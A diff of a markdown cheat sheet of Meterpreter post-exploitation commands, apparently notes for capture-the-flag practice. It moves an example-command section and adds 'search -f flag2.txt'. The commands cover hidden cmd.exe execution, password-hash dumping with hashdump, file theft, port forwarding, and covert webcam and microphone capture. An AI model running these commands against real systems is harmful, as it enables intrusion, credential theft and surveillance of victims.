@@ -1,35 +1,3 @@
-## Core
-
-- migrate 1234
-- run post/windows/gather/enum_logged_on_users
-- sessions -i 2
-
-## fs
-
-- cd C:\Windows\Temp
-- cat C:\Windows\System32\drivers\etc\hosts
-- edit notes.txt
-- rm old.log
-- search -f \*.pdf
-- upload tool.exe C:\Temp\tool.exe
-- download secret.txt
-
-## network
-
-- portfwd add -l 8080 -p tcp -r 127.0.0.1 -L 80
-
-## system
-
-- kill 4321
-- pkill chrome
-- execute -f cmd.exe -i -H
-
-## etc
-
-- webcam_snap -i 1
-- webcam_stream -i 1
-- record_mic -d 10
-
 ## Core Commands
 
 - `background` – Backgrounds the current session
@@ -39,7 +7,7 @@
 - `info` – Displays information about a Post module
 - `irb` – Opens an interactive Ruby shell on the current session
 - `load` – Loads one or more Meterpreter extensions
-- `migrate PID` – Migrate Meterpreter to another process
+- `migrate` – Migrate Meterpreter to another process
 - `run` – Executes a Meterpreter script or Post module
 - `sessions` – Quickly switch to another session
 
@@ -94,3 +62,37 @@
 - `hashdump` – Dump SAM (Security Account Manager) database
 
 ---
+
+## Core
+
+- migrate 1234
+- run post/windows/gather/enum_logged_on_users
+- sessions -i 2
+- load python
+
+## fs
+
+- cd C:\Windows\Temp
+- cat C:\Windows\System32\drivers\etc\hosts
+- edit notes.txt
+- rm old.log
+- search -f \*.pdf
+- search -f flag2.txt
+- upload tool.exe C:\Temp\tool.exe
+- download secret.txt
+
+## network
+
+- portfwd add -l 8080 -p tcp -r 127.0.0.1 -L 80
+
+## system
+
+- kill 4321
+- pkill chrome
+- execute -f cmd.exe -i -H
+
+## etc
+
+- webcam_snap -i 1
+- webcam_stream -i 1
+- record_mic -d 10
